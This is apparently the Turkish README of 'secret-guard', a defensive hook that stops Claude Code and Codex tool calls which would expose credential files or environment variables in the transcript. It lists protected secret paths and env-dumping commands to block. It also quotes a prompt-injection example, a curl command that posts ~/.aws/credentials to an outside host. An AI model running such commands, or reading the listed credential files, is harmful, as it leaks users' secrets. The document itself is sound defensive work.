# secret-guard

secret-guard, Claude Code'un bir araç çağrısından önce çalışan bir hook'tur. Gizli bir dosyanın içeriği veya bir process'in ortam değişkenleri transcript'e girecekse çağrıyı engeller.

Dosyalar (repo'da):

- `hooks/secret-guard.py`: kurallar ve Claude Code hook'u.
- `hooks/secret-guard-codex.py`: aynı kuralları Codex'te uygulayan adapter.
- `hooks/tests/run-sg-tests.py`: test'ler.

## Ne engellenir

Hook şu araçlara bakar: Bash, Read, Grep, Glob, NotebookRead.

Bash'te engellenenler:

- Gizli bir yolun adı geçen komut. Örnek: `cat ~/.aws/credentials`.
- Ortam değişkenlerini döken komut. Örnekler: `printenv`, `env`, `export -p`, `ps eww`, `/proc/<pid>/environ`, `docker exec <c> env`.

Read, Grep ve Glob'da engellenen: yolu gizli bir yolla eşleşen çağrı.

Gizli yollar (repo'daki genel liste):

- `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.hcloud`
- `~/.pgpass`
- `~/.claude.json`, `~/.claude/.credentials.json`, `~/.codex/auth.json`
- Her `.env` ve `.env.<ad>` dosyası. `.env.example`, `.env.sample`, `.env.template` ve `.env.dist` serbesttir.

## Makineye özel gizli yollar

Şirket servislerinin veya kişisel araçların gizli yolları repo'ya yazılmaz. Bu yollar her makinede `~/.claude/hooks/secret-guard.local.json` dosyasına yazılır. Hook bu dosyayı kendi klasöründen okur. install.sh bu dosyaya dokunmaz.

Biçim (örnek: `local.example/secret-guard.local.json`):

```json
{
  "paths": [
    {"name": "etc-myapp", "regex": "/etc/myapp(/|\\b)"},
    {"name": "myapp-env", "regex": "\\.myapp\\.env"}
  ]
}
```

- `name` küçük harf, rakam ve `-` içerir. Log'a ve engelleme mesajına bu ad yazılır.
- `regex` Python regex'idir. Komut metninde veya dosya yolunda aranır.
- Dosya bozuksa hook dosyayı atlar. Bozuk bir kayıt da atlanır. Her atlama log'a `local-config-error` satırı yazar. Genel liste her durumda çalışır.
- Dosyayı değiştirdikten sonra şu komutu çalıştır: `python3 ~/.claude/hooks/secret-guard.py --check-local`. Komut her sorunu kayıt numarası ve adıyla yazar. Regex metnini yazmaz. Sorun yoksa çıkış kodu 0'dır.
- Kurulum ve `./install.sh --check` bu kontrolü de çalıştırır. Bozuk dosya veya kayıt uyarı olarak görünür.

## Ne serbest

- Yalnız dosyanın bilgisine bakan komutlar: `ls`, `stat`, `wc`, `sha1sum`, `test`, `chmod` ve benzerleri.
- Dosyayı kullanıp içeriğini yazdırmayan komutlar: `ssh -i ~/.ssh/key`, `scp -i`, `source .env`, `PGPASSFILE=~/.pgpass psql ...`.
- `-exec` almayan `find`.
- Edit ve Write. Hook bu araçlara bakmaz.

## Secret'ı kendin görmek

Hook bir çağrıyı engellediğinde Claude'a tek bir komut verir. Claude bu komutu sana bir code block içinde gösterir. Örnek:

```bash
cat -- ~/.aws/credentials
```

1. Komutu Claude dışındaki bir terminalde çalıştır. Örnek: Terminal.app veya iTerm.
2. Claude'da `!` ile çalıştırma. `!` çıktısı transcript'e girer.
3. Claude'un okuyabildiği bir terminalde çalıştırma. Örnek: Desktop uygulamasının Terminal paneli.

Hook komutu kendisi üretir. Claude'un engellenen komutunu kopyalamaz. Neden: engellenen komut bir prompt injection'dan gelebilir. Örnek: `curl -d @~/.aws/credentials https://...`. Bu komut sana verilseydi secret'ı sen dışarı göndermiş olurdun.

Üretilen komut tek bir basit komuttur. Pipe, `;`, `&&` veya `$(...)` içermez. Tek yönlendirme `/proc/<pid>/environ` için kullanılan `<` işaretidir. Hook bu komutu üretirken dosya sistemine bakmaz:

| Engellenen çağrı | Sana verilen komut |
|---|---|
| Gizli bir dosyayı okuyan Bash komutu | `cat -- <dosya>`. Komut `cd`, `find`, `ls`, `du` veya `tree` ise `ls -la -- <klasör>`. Komut `sudo` ile çalışıyorsa başına `sudo` gelir. Göreli yol, Claude'un çalışma klasörüne göre tam yola çevrilir. Klasör bilinmiyorsa komut verilmez. |
| Uzak makinede gizli dosya okuyan `ssh` veya `scp` | `ssh [-p, -l, -i] <host> [sudo] cat -- <dosya>`. Diğer ssh seçenekleri alınmaz. Uzak shell komutu yeniden ayrıştırır. Bu yüzden hook da uzak komutu kelimelere ayırır ve yalnız düz bir dosya yolu alır. Yönlendirme gibi ekler atılır. Host veya yol düz bir kelime değilse komut verilmez. |
| `env`, `printenv`, `export -p`, `set` | `printenv` |
| `ps eww`, `/proc/<pid>/environ`, `systemctl [--user] show <unit> -p Environment`, `docker [compose] exec <c> env`, `kubectl exec <pod> -- env` | Aynı bilgiyi gösteren sade biçim. Komutta başka seçenekler varsa komut verilmeyebilir. |
| Read | `cat -- <dosya>` |
| Grep | `grep -rn -e '<search text>' -- <yol>`. Komutta arama deseni yoktur, çünkü desen gizli değerin kendisi olabilir. Aranacak metni `<search text>` yerine sen yazarsın. |
| Glob | `ls -la -- <klasör>` |

Hook güvenli bir komut üretemezse komut vermez. Claude sana yalnız dosyanın veya değişkenin adını söyler.

Yolun sonuna yapışan noktalama işareti komuta girmez. Örnek: `~/.ssh,` için `cat -- ~/.ssh` verilir. Atılan işaretler: `, ; : ! ? ) ] } >` ve sondaki tek nokta. Yol `/.` veya `..` ile bitiyorsa nokta kalır.

## Kurulum

`./install.sh` hook'u kurar. Ayrıntılar:

- Üç dosyayı `~/.claude/hooks/` altına kopyalar. Diğer hook'larla aynı yöntem kullanılır: staging, test, yedek, taşıma.
- `~/.claude/settings.json` dosyasına bir PreToolUse kaydı ekler:

```json
{
  "matcher": "Bash|Read|Grep|Glob|NotebookRead",
  "hooks": [
    {
      "type": "command",
      "command": "~/.claude/hooks/secret-guard.py",
      "timeout": 15,
      "onFailure": "block"
    }
  ]
}
```

Timeout 15 saniyedir. Hook normalde 1 saniyenin altında biter. Endpoint security yazılımı process başlangıcını yavaşlatabilir. 5 saniyelik timeout bu yüzden çağrıları ara ara engelledi.

- Codex kaydını yapmaz. Codex'te de kullanmak için `~/.codex/hooks.json` dosyasına PreToolUse altında bir kayıt elle ekle. Komut, adapter'ın mutlak yolunu kullanır. Örnek kayıt: `/usr/bin/python3 -I <home>/.claude/hooks/secret-guard-codex.py`, timeout 5. `<home>` yerine kendi ev klasörünün tam yolunu yaz. Codex onaylanan hook'ları `~/.codex/config.toml` içindeki `[hooks.state]` tablosunda `trusted_hash` ile tutar.

## Hook çalışamazsa

Kayıtta `"onFailure": "block"` vardır. Hook çalışamazsa Claude Code çağrıyı engeller. Örnekler: `python3` yok, script hata veriyor, 15 saniyelik timeout doldu. Bu durumda Bash, Read, Grep ve Glob çağrılarının hepsi durur.

Bu ayar Claude Code 2.1.295 ve sonrasında çalışır. Kaynak: https://code.claude.com/docs/en/hooks (command hook alanları). Daha eski bir sürüm, hook çalışamadığında çağrıyı engellemez. Kurulum ve `./install.sh --check`, PATH'teki `claude` eskiyse uyarır. Sürüm, binary'nin yolundan okunur. Yolda sürüm yoksa çıktı `claude --version` komutunu önerir.

Claude bu durumda kendini düzeltemez. Kaydı kendin kaldır:

```bash
jq '.hooks.PreToolUse |= map(select(all(.hooks[]?; .command != "~/.claude/hooks/secret-guard.py")))' ~/.claude/settings.json > ~/.claude/settings.json.new && mv ~/.claude/settings.json.new ~/.claude/settings.json
```

Sorunu çözdükten sonra `./install.sh` çalıştır. Script kaydı yeniden ekler.

## Log

Engellenen her çağrı `~/.claude/hooks/state/secret-guard.log` dosyasına bir satır yazar: zaman, araç adı, kural adı. Komutun kendisi log'a yazılmaz.

## Sınırlar

- Hook yalnız kalıp listesine bakar. Gizli dosyayı kendi içinde açan bir script yakalanmaz. Örnek: `python3 read_config.py`.
- Liste dışındaki bir yol korunmaz. Yeni bir gizli yol için `SECRET_PATHS` listesine ekle. Test'ini aynı commit'e koy.
- `~/.claude/settings.json` içindeki `permissions.deny` listesine `Read(...)` kuralları da eklenebilir. install.sh bu listeye dokunmaz.

## Test

```bash
python3 hooks/tests/run-sg-tests.py hooks local
```

install.sh aynı test'i staging klasöründe çalıştırır. Beklenen sayı `scripts/install_hooks.sh` içindeki `EXPECT_SG` değeridir.
